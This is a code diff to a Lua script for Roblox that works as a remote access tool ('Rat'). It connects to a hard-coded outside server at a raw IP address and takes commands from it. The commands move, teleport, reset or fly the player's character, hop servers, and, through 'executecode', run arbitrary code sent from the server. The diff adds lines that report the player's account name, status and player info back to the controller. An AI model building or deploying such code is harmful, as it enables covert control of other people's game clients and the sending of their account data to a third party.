@@ -14,14 +14,25 @@ end
 local client = KasflowsClient.new('http://87.120.166.48:8000')
 
 client:on("connect", function()
+    client:sendToClient("Rat", "notification", {
+        text = "Успешно подключенен аккаунт: " .. game.Players.LocalPlayer.Name,
+        type = "success"
+    })
 end)
 
 client:on("disconnect", function()
+    client:sendToClient("Rat", "notification", {
+        text = "Отключен от сервера",
+        type = "error"
+    })
 end)
 
 client:on("error", function(errorMessage)
+    client:sendToClient("Rat", "notification", {
+        text = "Ошибка: " .. errorMessage,
+        type = "error"
+    })
 end)
-
 client:on("action", function(message)
     if type(message) ~= "string" then
         return
@@ -41,7 +52,7 @@ client:on("action", function(message)
         local humanoid = character:WaitForChild("Humanoid")
         local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
         
-        if command == "run" then
+        if command == "runING" then
             local distance = arg and tonumber(arg) or 10
             local forwardDirection = humanoidRootPart.CFrame.LookVector
             local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
@@ -51,7 +62,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
             tween:Play()
             
-        elseif command == "runright" then
+        elseif command == "runrightING" then
             local distance = arg and tonumber(arg) or 10
             local rightDirection = humanoidRootPart.CFrame.RightVector
             local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
@@ -61,7 +72,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
             tween:Play()
             
-        elseif command == "runleft" then
+        elseif command == "runleftING" then
             local distance = arg and tonumber(arg) or 10
             local leftDirection = -humanoidRootPart.CFrame.RightVector
             local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
@@ -71,7 +82,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
             tween:Play()
             
-        elseif command == "runback" then
+        elseif command == "runbackING" then
             local distance = arg and tonumber(arg) or 10
             local backwardDirection = -humanoidRootPart.CFrame.LookVector
             local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
@@ -81,60 +92,60 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
             tween:Play()
             
-        elseif command == "jump" then
+        elseif command == "jumpING" then
             humanoid.Jump = true
             
-        elseif command == "teleportforward" then
+        elseif command == "teleportforwardING" then
             local distance = arg and tonumber(arg) or 10
             local forwardDirection = humanoidRootPart.CFrame.LookVector
             local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "teleportback" then
+        elseif command == "teleportbackING" then
             local distance = arg and tonumber(arg) or 10
             local backwardDirection = -humanoidRootPart.CFrame.LookVector
             local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "teleportleft" then
+        elseif command == "teleportleftING" then
             local distance = arg and tonumber(arg) or 10
             local leftDirection = -humanoidRootPart.CFrame.RightVector
             local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "teleportright" then
+        elseif command == "teleportrightING" then
             local distance = arg and tonumber(arg) or 10
             local rightDirection = humanoidRootPart.CFrame.RightVector
             local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "teleportup" then
+        elseif command == "teleportupING" then
             local distance = arg and tonumber(arg) or 10
             local upDirection = Vector3.new(0, 1, 0)
             local targetPosition = humanoidRootPart.Position + (upDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "teleportdown" then
+        elseif command == "teleportdownING" then
             local distance = arg and tonumber(arg) or 10
             local downDirection = Vector3.new(0, -1, 0)
             local targetPosition = humanoidRootPart.Position + (downDirection * distance)
             
             humanoidRootPart.CFrame = CFrame.new(targetPosition)
             
-        elseif command == "speed" then
+        elseif command == "speedING" then
             local speedValue = arg and tonumber(arg) or 16 
             humanoid.WalkSpeed = speedValue
             
-        elseif command == "jumppower" then
+        elseif command == "jumppowerING" then
             local jumpValue = arg and tonumber(arg) or 50
             humanoid.JumpPower = jumpValue
             
-        elseif command == "fly" then
+        elseif command == "flyING" then
             local flying = humanoid:FindFirstChild("Flying")
             
             if flying then
@@ -220,7 +231,7 @@ client:on("action", function(message)
                     end
                 end)
             end
-        elseif command == "turnleft" then
+        elseif command == "turnleftING" then
             local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
             
             local currentCFrame = humanoidRootPart.CFrame
@@ -231,7 +242,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
             tween:Play()
             
-        elseif command == "turnright" then
+        elseif command == "turnrightING" then
             local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
             
             local currentCFrame = humanoidRootPart.CFrame
@@ -242,7 +253,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
             tween:Play()
             
-        elseif command == "lookup" then
+        elseif command == "lookupING" then
             local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
             
             local currentCFrame = humanoidRootPart.CFrame
@@ -253,7 +264,7 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
             tween:Play()
             
-        elseif command == "lookdown" then
+        elseif command == "lookdownING" then
             local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
             
             local currentCFrame = humanoidRootPart.CFrame
@@ -264,20 +275,20 @@ client:on("action", function(message)
             local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
             tween:Play()
             
-        elseif command == "resetcamera" then
+        elseif command == "resetcameraING" then
             local position = humanoidRootPart.Position
             humanoidRootPart.CFrame = CFrame.new(position)
             
-        elseif command == "getposition" then
+        elseif command == "getpositionING" then
             local position = humanoidRootPart.Position
             local x = math.floor(position.X * 10) / 10
             local y = math.floor(position.Y * 10) / 10
             local z = math.floor(position.Z * 10) / 10
             
-        elseif command == "sit" then
+        elseif command == "sitING" then
             humanoid.Sit = true
             
-        elseif command == "dance" then
+        elseif command == "danceING" then
             local function doDanceMove()
                 local randomAngle = math.random(-30, 30)
                 local currentCFrame = humanoidRootPart.CFrame
@@ -298,14 +309,14 @@ client:on("action", function(message)
                 wait(0.5)
             end
             
-        elseif command == "wave" then
+        elseif command == "waveING" then
             
-        elseif command == "laugh" then
+        elseif command == "laughING" then
             
-        elseif command == "reset" then
+        elseif command == "resetING" then
             character:BreakJoints()
             
-        elseif command == "executecode" then
+        elseif command == "executecodeING" then
             local code = arg
             if not code then
                 return
@@ -321,7 +332,7 @@ client:on("action", function(message)
                 return
             end
             
-        elseif command == "serverhop" then
+        elseif command == "serverhopING" then
             local teleportService = game:GetService("TeleportService")
             local httpService = game:GetService("HttpService")
             local placeId = game.PlaceId
@@ -353,7 +364,7 @@ client:on("action", function(message)
                 end
             end)
             
-        elseif command == "teleporttogame" then
+        elseif command == "teleporttogameING" then
             local placeId = arg and tonumber(arg)
             if not placeId then
                 return
@@ -364,7 +375,7 @@ client:on("action", function(message)
                 teleportService:Teleport(placeId, game.Players.LocalPlayer)
             end)
             
-        elseif command == "joinplayer" then
+        elseif command == "joinplayerING" then
             local playerName = arg
             if not playerName or playerName == "" then
                 return
@@ -376,7 +387,7 @@ client:on("action", function(message)
                 serverid = serverid
             })
             
-        elseif command == "getplayerinfo" then
+        elseif command == "getplayerinfoING" then
             local player = game.Players.LocalPlayer
             local character = player.Character or player.CharacterAdded:Wait()
             local humanoid = character:WaitForChild("Humanoid")
@@ -400,12 +411,12 @@ client:on("action", function(message)
             end)
             
             if success then
-                client:emit("playerInfo", {
+                client:sendToClient("Rat", "playerInfo", {
                     playerInfo = result
                 })
             end
             
-        elseif command == "rejoin" then
+        elseif command == "rejoinING" then
             local success, errorMsg = pcall(function()
                 local teleportService = game:GetService("TeleportService")
                 local placeId = game.PlaceId
@@ -418,7 +429,7 @@ client:on("action", function(message)
                 end
             end)
             
-        elseif command == "joinplayerbyid" then
+        elseif command == "joinplayerbyidING" then
             local userId = arg and tonumber(arg)
             if not userId then
                 return
@@ -452,6 +463,17 @@ client:on("action", function(message)
             end)
         end
     end)
+    if not success then
+        client:sendToClient("Rat", "notification", {
+            text = "Ошибка при выполнении команды: " .. errorMsg,
+            type = "error"
+        })
+    else
+        client:sendToClient("Rat", "notification", {
+            text = "Команда выполнена успешно",
+            type = "success"
+        })
+    end
 end)
 
 client:on("joinplayerbyinfo", function(data)
